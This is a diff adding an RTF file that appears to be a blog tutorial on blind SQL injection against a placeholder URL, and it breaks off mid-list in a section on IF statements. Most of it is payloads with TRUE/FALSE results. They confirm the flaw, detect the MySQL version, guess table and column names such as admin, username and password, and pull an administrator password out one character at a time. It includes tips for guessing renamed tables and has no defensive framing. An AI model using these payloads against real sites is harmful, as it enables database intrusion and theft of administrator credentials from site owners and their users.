@@ -1,0 +1,661 @@
+{\rtf1\ansi\ansicpg1252\cocoartf1404\cocoasubrtf470
+{\fonttbl\f0\fnil\fcharset0 Calibri;\f1\fswiss\fcharset0 ArialMT;\f2\fnil\fcharset0 LucidaGrande;
+\f3\froman\fcharset0 TimesNewRomanPSMT;\f4\fmodern\fcharset0 CourierNewPSMT;\f5\fswiss\fcharset0 Helvetica;
+\f6\fnil\fcharset0 Verdana;\f7\fmodern\fcharset0 Courier;\f8\fmodern\fcharset0 Courier-Oblique;
+\f9\fmodern\fcharset0 Courier-Bold;}
+{\colortbl;\red255\green255\blue255;\red0\green0\blue0;\red190\green0\blue4;\red0\green0\blue255;
+}
+{\*\listtable{\list\listtemplateid1\listhybrid{\listlevel\levelnfc23\levelnfcn23\leveljc0\leveljcn0\levelfollow0\levelstartat1\levelspace360\levelindent0{\*\levelmarker \{disc\}}{\leveltext\leveltemplateid1\'01\uc0\u8226 ;}{\levelnumbers;}\fi-360\li720\lin720 }{\listname ;}\listid1}
+{\list\listtemplateid2\listhybrid{\listlevel\levelnfc23\levelnfcn23\leveljc0\leveljcn0\levelfollow0\levelstartat1\levelspace360\levelindent0{\*\levelmarker \{disc\}}{\leveltext\leveltemplateid101\'01\uc0\u8226 ;}{\levelnumbers;}\fi-360\li720\lin720 }{\listname ;}\listid2}
+{\list\listtemplateid3\listhybrid{\listlevel\levelnfc23\levelnfcn23\leveljc0\leveljcn0\levelfollow0\levelstartat1\levelspace360\levelindent0{\*\levelmarker \{disc\}}{\leveltext\leveltemplateid201\'01\uc0\u8226 ;}{\levelnumbers;}\fi-360\li720\lin720 }{\listname ;}\listid3}
+{\list\listtemplateid4\listhybrid{\listlevel\levelnfc23\levelnfcn23\leveljc0\leveljcn0\levelfollow0\levelstartat1\levelspace360\levelindent0{\*\levelmarker \{disc\}}{\leveltext\leveltemplateid301\'01\uc0\u8226 ;}{\levelnumbers;}\fi-360\li720\lin720 }{\listname ;}\listid4}}
+{\*\listoverridetable{\listoverride\listid1\listoverridecount0\ls1}{\listoverride\listid2\listoverridecount0\ls2}{\listoverride\listid3\listoverridecount0\ls3}{\listoverride\listid4\listoverridecount0\ls4}}
+\paperw11900\paperh16840\margl1440\margr1440\vieww16100\viewh9620\viewkind0
+\deftab720
+\pard\pardeftab720\partightenfactor0
+
+\f0\b\fs30 \cf1 \cb2 \expnd0\expndtw0\kerning0
+\ul \ulc1 BLIND SQLi\
+
+\b0 \ulnone \
+We will begin by using AND/OR statement to confirm the site is vulnerable and then to work on extracting information and finally database contents. We can confirm the vulnerability of a page link similar to how we used the single quotation mark in previous examples, only for BLIND injections we will be using TRUE/FALSE statements to gain result, which at times may be based around the feedback received from the server as a result. The basic check works like this:\
+
+\f1 \
+
+\f0 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0{\field{\*\fldinst{HYPERLINK "http://www.site.com/index.php?id=725"}}{\fldrslt http://www.site.com/index.php?id=725}} AND 1=1\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 (No Errors)
+\f1 \
+
+\f0 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0{\field{\*\fldinst{HYPERLINK "http://www.site.com/index.php?id=725"}}{\fldrslt http://www.site.com/index.php?id=725}} AND 1=2\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 (Errors on Page)\
+
+\f1 \
+
+\f0 We are hoping to find a difference in how the two pages are displayed as a result of our trailing statement, just like we did with the single quotes on original tutorial.\
+\
+If we analyze them real quick we can see that 1 is always equal to 1 so it must be TRUE, whereas 1 does not equal 2 and thus should return FALSE. \
+\
+The differences when page refreshes may be highlighted by errors as in previous examples or it may be less subtle and may only be pictures failing to properly display, or pieces of the page missing text. The key is to simply look for differences, as these differences indicate we may have found an vulnerability. \
+\
+We now have the column count, but we will need to check the version real quick to make sure we use the proper methods to extract information \
+ We can check the version by running two request statements and comparing the results, whichever requests returns TRUE lets us know the version number. The two requests looks like this:\
+
+\f1 \
+
+\f0 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0{\field{\*\fldinst{HYPERLINK "http://www.site.com/index.php?id=725%E2%80%99"}}{\fldrslt http://www.site.com/index.php?id=725\'92}} \'a0and substring(@@version,1,1)=4--+-\'92
+\f1 \
+
+\f0 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0{\field{\*\fldinst{HYPERLINK "http://www.site.com/index.php?id=725%E2%80%99"}}{\fldrslt http://www.site.com/index.php?id=725\'92}}\'a0 and substring(@@version,1,1)=5--+-\'92\
+\
+Alright, in this example we can see it is v5. OK, now we have the basics out of the way it is time to start enumerating some table names from the current database. We will use TRUE/FALSE request statements and then analyze the errors or response generated to determine if we are on the right track, as we will need to start by guessing the table names. This may take some guessing and sometime which is why most people don\'92t like this method, but it can pay off when nothing else will work so just have some patience. It will work like this:\
+\
+\ul GUESS TABLE NAMES:
+\f1 \ulnone \
+\
+\pard\pardeftab720\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "http://www.site.com/index.php?id=725%E2%80%99"}}{\fldrslt 
+\f0 \cf1 http://www.site.com/index.php?id=725\'92}}
+\f0  \'a0and (SELECT 1 from passwords limit 0,1)=1--+-\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 \'a0\'a0\'a0 (Errors)\'92
+\f1 \
+{\field{\*\fldinst{HYPERLINK "http://www.site.com/index.php?id=725%E2%80%99"}}{\fldrslt 
+\f0 http://www.site.com/index.php?id=725\'92}}
+\f0  \'a0and (SELECT 1 from users limit 0,1)=1--+-\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0	 (Errors)\'92
+\f1 \
+{\field{\*\fldinst{HYPERLINK "http://www.site.com/index.php?id=725%E2%80%99"}}{\fldrslt 
+\f0 http://www.site.com/index.php?id=725\'92}}
+\f0 \'a0 and (SELECT 1 from members limit 0,1)=1--+-\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 	(Errors)\'92
+\f1 \
+{\field{\*\fldinst{HYPERLINK "http://www.site.com/index.php?id=725%E2%80%99"}}{\fldrslt 
+\f0 http://www.site.com/index.php?id=725\'92}}
+\f0 \'a0 and (SELECT 1 from admin limit 0,1)=1--+-\'a0\'a0\'a0\'a0\'a0		\'a0(No Errors!)\'92
+\f1 \
+\
+\pard\pardeftab720\partightenfactor0
+
+\f0 \cf1 If we get the page to refresh without any errors it is an indication that the table actually exists, whereas if the table does not exist the server will generate an error of some kind. We will use this info to map things out and simply keep replacing the table referenced after the FROM part of the statement until you are satisfied you have found all of the ones you\'92re interested in. In our example above we have found the table \'93admin\'94 as the page refreshed 100% indicating the table name is present whereas errors were received on all of the others.
+\f1 \
+\
+\pard\pardeftab720\partightenfactor0
+
+\f0\b \cf1 NOTE:
+\b0  In the errors sometimes it will say \'93Table 'X.<guessed-table-name>' doesn't exist\'94. This error indicates the current database name where \'93X\'94 is (in case you couldn\'92t find it elsewhere).\
+\pard\pardeftab720\partightenfactor0
+
+\f1 \cf1 \
+\pard\pardeftab720\partightenfactor0
+
+\f0\b \cf1 TIP
+\b0 :\'a0 When guessing table names, start with the obvious ones and then work to more general ones. Also if you know you only care about specific ones then only work on those ones (admin, users, members, admincp, etc). \
+\
+Also be aware that not all admins are 100% dummies so they may have done something super tricky like rename them. I find a lot like to use site-name as prefix, or site-prefix-db and then the table or database names (i.e. Microsoft.com might use this type of naming convention m_admin, m_users, m_members, or maybe mdb_admin, mdb_users, etc). \
+If you have time make sure you try all options as once you find one the rest typically follow the same naming convention.\
+\
+\pard\pardeftab720\partightenfactor0
+\cf1 \ul \ulc1 GUESS COLUMN NAMES:\
+\ulnone \
+We now have a valid table name, so it is time to change our syntax slightly so we can try to guess column names from the table that we already know is there. Again, we will be using the TRUE/FALSE results to determine what columns are present in the table. It will work like this:
+\f1 \
+\
+\pard\pardeftab720\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "http://www.site.com/index.php?id=725%E2%80%99"}}{\fldrslt 
+\f0 \cf3 http://www.site.com/index.php?id=725\'92}}
+\f0 \cf4 \'a0 \'a0and (SELECT substring(concat(1,<insert-column-guess-here>),1,1) from <table-name> limit 0,1)=1--+-\cf1 \'92
+\f1 \
+\
+\pard\pardeftab720\partightenfactor0
+
+\f0 \cf1 We are now using SUBSTRING to query within query and check for columns FROM our found table (admin). Again, we will be guessing for the most part, but you can typically go for the main columns depending on what you are going for (i.e. id, userid, adminid, login, pass, password, email, access_level, etc). The process works the same as tables and you simply repeat until you think you got them all or at least the ones you need, to continue our example\'85
+\f1 \
+\
+\pard\pardeftab720\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "http://www/site.com/index.php?id=725%E2%80%99"}}{\fldrslt 
+\f0\fs26 \cf3 http://www/site.com/index.php?id=725\'92}}
+\f0\fs26 \cf4  and (SELECT substring(concat(1,userid),1,1) from admin limit 0,1)=1--+-\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0(No Errors!!)\cf1 \'92
+\f1 \
+{\field{\*\fldinst{HYPERLINK "http://www/site.com/index.php?id=725%E2%80%99"}}{\fldrslt 
+\f0 \cf3 http://www/site.com/index.php?id=725\'92}}
+\f0 \cf4  and (SELECT substring(concat(1,login),1,1) from admin limit 0,1)=1--+-\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0(Errors)\cf1 \'92
+\f1 \
+{\field{\*\fldinst{HYPERLINK "http://www/site.com/index.php?id=725%E2%80%99"}}{\fldrslt 
+\f0 \cf3 http://www/site.com/index.php?id=725\'92}}
+\f0 \cf4  and (SELECT substring(concat(1,username),1,1) from admin limit 0,1)=1--+-\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 (No Errors!!)\cf1 \'92
+\f1 \
+{\field{\*\fldinst{HYPERLINK "http://www/site.com/index.php?id=725%E2%80%99"}}{\fldrslt 
+\f0 \cf3 http://www/site.com/index.php?id=725\'92}}
+\f0 \cf4  and (SELECT substring(concat(1,password),1,1) from admin limit 0,1)=1--+-\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0(No Errors!!)\cf1 \'92
+\f1\fs30 \
+\
+\pard\pardeftab720\partightenfactor0
+
+\f0 \cf1 It looks like we have found the columns \'93userid\'94, \'93username\'94 and \'93password\'94 from our \'93admin\'94 table.
+\f1 \
+
+\f0 \
+\ul GUESS DATA:\
+\ulnone \
+Now that we have found the table name and associated column names we can actually extract some data. In order to extract we will change up our syntax slightly so that it takes advantage of the ASCII CHAR conversion. \
+\
+We will again analyze the results of based on TRUE/FALSE responses. \
+\
+This part is very time consuming as we have to get each letter at a time (in CHAR value) and then convert it over to get the standard plain text that most people can identify with. The process should go something like this:
+\f1 \
+\
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf1 \'b7
+\f3 \'a0
+\fs26 \'a0\'a0\'a0\'a0\'a0\'a0\'a0 {\field{\*\fldinst{HYPERLINK "http://www/site.com/index.php?id=725"}}{\fldrslt 
+\f0 \cf4 http://www/site.com/index.php?id=725}}
+\f0 \'92 and ascii(substring((SELECT concat(username,0x3a,password) from users where userid=1),1,1))>65\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0
+\f1 \
+\pard\pardeftab720\partightenfactor0
+
+\f4 \cf1 o
+\f3 \'a0\'a0 
+\f0 TRUE \'96 the first char of password for admin with userid1 is great than 65 so we need to go higher with our next request until we hit error\
+\pard\pardeftab720\partightenfactor0
+
+\f1 \cf1 \
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 {\field{\*\fldinst{HYPERLINK "http://www/site.com/index.php?id=725"}}{\fldrslt 
+\f0 \cf4 http://www/site.com/index.php?id=725}}
+\f0 \'92 and ascii(substring((SELECT concat(username,0x3a,password) from users where userid=1),1,1))>122\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0
+\f1 \
+\pard\pardeftab720\partightenfactor0
+
+\f4 \cf1 o
+\f3 \'a0\'a0 
+\f0 FALSE \'96 Error, indicating it is not a char greater than 122 which is good as that is what we would expect, so now we need to meet in the middle\
+\pard\pardeftab720\partightenfactor0
+
+\f1 \cf1 \
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 {\field{\*\fldinst{HYPERLINK "http://www/site.com/index.php?id=725"}}{\fldrslt 
+\f0 \cf4 http://www/site.com/index.php?id=725}}
+\f0 \'92 and ascii(substring((SELECT concat(username,0x3a,password) from users where userid=1),1,1))>100
+\f1 \
+\pard\pardeftab720\partightenfactor0
+
+\f4 \cf1 o
+\f3 \'a0\'a0 
+\f0 TRUE \'96 still need to continue moving higher\
+\pard\pardeftab720\partightenfactor0
+
+\f1 \cf1 \
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 {\field{\*\fldinst{HYPERLINK "http://www/site.com/index.php?id=725"}}{\fldrslt 
+\f0 \cf4 http://www/site.com/index.php?id=725}}
+\f0 \'92 and ascii(substring((SELECT concat(username,0x3a,password) from users where userid=1),1,1))>115
+\f1 \
+\pard\pardeftab720\partightenfactor0
+
+\f4 \cf1 o
+\f3 \'a0\'a0 
+\f0 FALSE \'96 getting warmer, but still need to reduce a little\
+\pard\pardeftab720\partightenfactor0
+
+\f1 \cf1 \
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 {\field{\*\fldinst{HYPERLINK "http://www/site.com/index.php?id=725"}}{\fldrslt 
+\f0 \cf4 http://www/site.com/index.php?id=725}}
+\f0 \'92 and ascii(substring((SELECT concat(username,0x3a,password) from users where userid=1),1,1))>112
+\f1 \
+\pard\pardeftab720\partightenfactor0
+
+\f4 \cf1 o
+\f3 \'a0\'a0 
+\f0 TRUE \'96 still need to continue moving higher\
+\pard\pardeftab720\partightenfactor0
+
+\f1 \cf1 \
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 {\field{\*\fldinst{HYPERLINK "http://www/site.com/index.php?id=725"}}{\fldrslt 
+\f0 \cf4 http://www/site.com/index.php?id=725}}
+\f0 \'92 and ascii(substring((SELECT concat(username,0x3a,password) from users where userid=1),1,1))>113
+\f1 \
+\pard\pardeftab720\partightenfactor0
+
+\f4 \cf1 o
+\f3 \'a0\'a0 
+\f0 FALSE \'96 indicating we have gone too far \'96 WTF?\
+\pard\pardeftab720\partightenfactor0
+
+\f1 \cf1 \
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 {\field{\*\fldinst{HYPERLINK "http://www/site.com/index.php?id=725"}}{\fldrslt 
+\f0 \cf4 http://www/site.com/index.php?id=725}}
+\f0 \'92 and ascii(substring((SELECT concat(username,0x3a,password) from users where userid=1),1,1))>111
+\f1 \
+\pard\pardeftab720\partightenfactor0
+
+\f4 \cf1 o
+\f3 \'a0\'a0 
+\f0 TRUE \'96 Indicating we need to move up
+\f1\fs30 \
+\
+\pard\pardeftab720\partightenfactor0
+
+\f0 \cf1 As you can see this can take some time. In the example above we would use some reasoning and determine that the char value is greater than 111, but less than 113. When we ran the test against 112 it indicated as true thus meaning it is greater than OR equal to 112. If we convert this we get the letter \'93p\'94. OK so we have the first letter, now let\'92s adjust our LIMIT at the end to move on to the second character position. We will also do our best to use our brains to speed things up and start guessing the next logical character to follow a \'93p\'94 (like maybe an \'93a\'94 = 97). It now looks like this:
+\f1 \
+\
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 {\field{\*\fldinst{HYPERLINK "http://www/site.com/index.php?id=725"}}{\fldrslt 
+\f0 \cf4 http://www/site.com/index.php?id=725}}
+\f0 \'92 and ascii(substring((SELECT concat(username,0x3a,password) from users where userid=1),
+\b 2
+\b0 ,1))>97
+\f1 \
+\pard\pardeftab720\partightenfactor0
+
+\f4 \cf1 o
+\f3 \'a0\'a0 
+\f0 TRUE \'96 Indicating we need to move up\
+\pard\pardeftab720\partightenfactor0
+
+\f1 \cf1 \
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 {\field{\*\fldinst{HYPERLINK "http://www/site.com/index.php?id=725"}}{\fldrslt 
+\f0 \cf4 http://www/site.com/index.php?id=725}}
+\f0 \'92 and ascii(substring((SELECT concat(username,0x3a,password) from users where userid=1),
+\b 2
+\b0 ,1))>98
+\f1 \
+\pard\pardeftab720\partightenfactor0
+
+\f4 \cf1 o
+\f3 \'a0\'a0 
+\f0 FALSE \'96 indicating we have gone too far and that we were right with the guess of an \'93a\'94 which is the char value for 97
+\f1 \
+\
+\pard\pardeftab720\partightenfactor0
+
+\f0 \cf1 OK so we have no found the first two letters of the password which are \'93pa\'94, let\'92s keep guessing\'85.\
+
+\f1 \
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 {\field{\*\fldinst{HYPERLINK "http://www/site.com/index.php?id=725"}}{\fldrslt 
+\f0 \cf4 http://www/site.com/index.php?id=725}}
+\f0 \'92 and ascii(substring((SELECT concat(username,0x3a,password) from users where userid=1),
+\b 3
+\b0 ,1))>115
+\f1 \
+\pard\pardeftab720\partightenfactor0
+
+\f4 \cf1 o
+\f3 \'a0\'a0 
+\f0 TRUE \'96 Indicating we need to move up\
+\pard\pardeftab720\partightenfactor0
+
+\f1 \cf1 \
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 {\field{\*\fldinst{HYPERLINK "http://www/site.com/index.php?id=725"}}{\fldrslt 
+\f0 \cf4 http://www/site.com/index.php?id=725}}
+\f0 \'92 and ascii(substring((SELECT concat(username,0x3a,password) from users where userid=1),
+\b 3
+\b0 ,1))>116
+\f1 \
+\pard\pardeftab720\partightenfactor0
+
+\f4 \cf1 o
+\f3 \'a0\'a0 
+\f0 FALSE \'96 indicating we have gone too far and that we were right on track with the guessing of an \'93s\'94 which is the char value for 115\'85wonder what\'92s next?\
+\pard\pardeftab720\partightenfactor0
+
+\f1 \cf1 \
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 {\field{\*\fldinst{HYPERLINK "http://www/site.com/index.php?id=725"}}{\fldrslt 
+\f0 \cf4 http://www/site.com/index.php?id=725}}
+\f0 \'92 and ascii(substring((SELECT concat(username,0x3a,password) from users where userid=1),
+\b 4
+\b0 ,1))>116
+\f1 \
+\pard\pardeftab720\partightenfactor0
+
+\f4 \cf1 o
+\f3 \'a0\'a0 
+\f0 FALSE \'96 indicating we have gone to far and found us another \'93s\'94 or 115\
+\pard\pardeftab720\partightenfactor0
+
+\f1 \cf1 \
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 {\field{\*\fldinst{HYPERLINK "http://www/site.com/index.php?id=725"}}{\fldrslt 
+\f0 \cf4 http://www/site.com/index.php?id=725}}
+\f0 \'92 and ascii(substring((SELECT concat(username,0x3a,password) from users where userid=1),
+\b 4
+\b0 ,1))>115
+\f1 \
+\pard\pardeftab720\partightenfactor0
+
+\f4 \cf1 o
+\f3 \'a0\'a0 
+\f0 TRUE \'96 indicating we have found another \'93s\'94
+\f1 \
+\
+\pard\pardeftab720\partightenfactor0
+
+\f0 \cf1 When we put it together we have found char values of 112, 97, 115, & 115 which when converted equates to \'93pass\'94. The admin with userid=1 has a password of \'93pass\'94.\'a0 In some cases the char values may be for an MD5 hash so it might not come across until you have the entire thing. You can keep adjusting the LIMIT value until you no longer get any return values (i.e. ERRORS) indicating there are no more character positions to enumerate.
+\f1 \
+\
+\pard\pardeftab720\partightenfactor0
+
+\f0\b \cf1 NOTE:
+\b0  To help speed things up we can use the start and end point for the ASCII chart which starts \'93A\'94 at 65 and has \'93z\'94 at 122. You can then use the results to narrow down your search to more appropriate section or letter. I tend to focus on the lower case options first (97-122) to speed things up, but the full chart can come into play in the wild. I will be working to add a page or post with a full ASCII conversion chart but is a pain to put it into HTML table format so it will format correctly on this blog (I already tried several times to take an easier route, but will have this up in a few weeks\'92 time so please check back.
+\f1 \
+\
+\
+\pard\pardeftab720\partightenfactor0
+
+\f0\b \cf1 \ul \ulc1 EXTRA REFERENCE MATERIAL
+\b0 :\
+
+\f1 \ulnone \
+\pard\pardeftab720\partightenfactor0
+
+\f0\b \cf1 USING MID() TO CHECK VERSION:
+\f1\b0 \
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://www.site.com/index.php?id=725 AND 1=1--\'a0\'a0\'a0\'a0\'a0\'a0\'a0
+\f1 \
+\pard\pardeftab720\partightenfactor0
+
+\f4 \cf1 o
+\f3 \'a0\'a0 
+\f0 No Errors\
+\pard\pardeftab720\partightenfactor0
+
+\f1 \cf1 \
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://www.site.com/index.php?id=725 AND 1=2\'97
+\f1 \
+\pard\pardeftab720\partightenfactor0
+
+\f4 \cf1 o
+\f3 \'a0\'a0 
+\f0 Errors!\
+\pard\pardeftab720\partightenfactor0
+
+\f1 \cf1 \
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://www.site.com/index.php?id=725 AND ORD(MID((VERSION()), 1, 1)) > 51
+\f1 \
+\pard\pardeftab720\partightenfactor0
+
+\f4 \cf1 o
+\f3 \'a0\'a0 
+\f0 TRUE \'96 go higher\
+\pard\pardeftab720\partightenfactor0
+
+\f1 \cf1 \
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://www.site.com/index.php?id=725 AND ORD(MID((VERSION()), 1, 1)) > 53
+\f1 \
+\pard\pardeftab720\partightenfactor0
+
+\f4 \cf1 o
+\f3 \'a0\'a0 
+\f0 TRUE = go higher\
+\pard\pardeftab720\partightenfactor0
+
+\f1 \cf1 \
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://www.site.com/index.php?id=725 AND ORD(MID((VERSION()), 1, 1)) > 52
+\f1 \
+\pard\pardeftab720\partightenfactor0
+
+\f4 \cf1 o
+\f3 \'a0\'a0 
+\f0 TRUE \'96 go higher\
+\pard\pardeftab720\partightenfactor0
+
+\f1 \cf1 \
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://www.site.com/index.php?id=725 AND ORD(MID((VERSION()), 1, 1)) > 54
+\f1 \
+\pard\pardeftab720\partightenfactor0
+
+\f4 \cf1 o
+\f3 \'a0\'a0 
+\f0 FALSE = CHAR=53\
+\pard\pardeftab720\partightenfactor0
+
+\f1 \cf1 \
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://www.site.com/index.php?id=725 AND ORD(MID((VERSION()), 
+\b 2
+\b0 , 1)) > 43
+\f1 \
+\pard\pardeftab720\partightenfactor0
+
+\f4 \cf1 o
+\f3 \'a0\'a0 
+\f0 TRUE \'96 does not use \'93+\'94 for separation of version digits, go higher\
+\pard\pardeftab720\partightenfactor0
+
+\f1 \cf1 \
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://www.site.com/index.php?id=725 AND ORD(MID((VERSION()), 
+\b 2
+\b0 , 1)) > 45
+\f1 \
+\pard\pardeftab720\partightenfactor0
+
+\f4 \cf1 o
+\f3 \'a0\'a0 
+\f0 TRUE \'96 does not use \'93-\'94 for separation of version digits, go higher\
+\pard\pardeftab720\partightenfactor0
+
+\f1 \cf1 \
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://www.site.com/index.php?id=725 AND ORD(MID((VERSION()), 
+\b 2
+\b0 , 1)) > 46
+\f1 \
+\pard\pardeftab720\partightenfactor0
+
+\f4 \cf1 o
+\f3 \'a0\'a0 
+\f0 TRUE \'96 uses \'93.\'94 for separation of version digits as if we tested 47 next it would be FALSE\
+\pard\pardeftab720\partightenfactor0
+
+\f1 \cf1 \
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://www.site.com/index.php?id=725 AND ORD(MID((VERSION()), 
+\b 3
+\b0 , 1)) > 51
+\f1 \
+\pard\pardeftab720\partightenfactor0
+
+\f4 \cf1 o
+\f3 \'a0\'a0 
+\f0 FALSE = must be lower\
+\pard\pardeftab720\partightenfactor0
+
+\f1 \cf1 \
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://www.site.com/index.php?id=725 AND ORD(MID((VERSION()), 
+\b 3
+\b0 , 1)) > 49
+\f1 \
+\pard\pardeftab720\partightenfactor0
+
+\f4 \cf1 o
+\f3 \'a0\'a0 
+\f0 FALSE = must be lower\
+\pard\pardeftab720\partightenfactor0
+
+\f1 \cf1 \
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://www.site.com/index.php?id=725 AND ORD(MID((VERSION()), 
+\b 3
+\b0 , 1)) > 48
+\f1 \
+\pard\pardeftab720\partightenfactor0
+
+\f4 \cf1 o
+\f3 \'a0\'a0 
+\f0 TRUE \'96 indicating CHAR=48\
+\pard\pardeftab720\partightenfactor0
+
+\f1 \cf1 \
+\pard\pardeftab720\partightenfactor0
+
+\f2 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0\b MID()
+\b0  \'96 can be used to extract characters from a text field
+\f1 \
+\
+\pard\pardeftab720\partightenfactor0
+
+\f0\b \cf1 RESULTS =
+\b0  53, 46, 48, which converts to \'935.0\'94. You would simply keep increasing the LIMIT to move forward character positions until you hit the end and error out. You usually don\'92t have to check the \'93-\'93 or \'93+\'94 signs until further down the version description (i.e. 5.0.1+log or 5.3.7-community) but thought I would show you how to test for them in the examples.\
+\
+\pard\pardeftab720\partightenfactor0
+
+\f5 \cf1 \kerning1\expnd0\expndtw0 \'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\pard\pardeftab720\partightenfactor0
+\cf1 \expnd0\expndtw0\kerning0
+If Statements\
+\pard\pardeftab720\partightenfactor0
+
+\f6 \cf1 Get response based on a if statement. \
+This is\'a0
+\b one of the key points of Blind SQL Injection
+\b0 , also can be very useful to test simple stuff blindly and 
+\b accurately
+\b0 .\
+\
+
+\b MySQL If Statement\
+\pard\tx220\tx720\pardeftab720\li720\fi-720\partightenfactor0
+\ls1\ilvl0
+\f7\b0 \cf1 \kerning1\expnd0\expndtw0 {\listtext	\'95	}\expnd0\expndtw0\kerning0
+IF(
+\f8\i condition
+\f9\i0\b ,
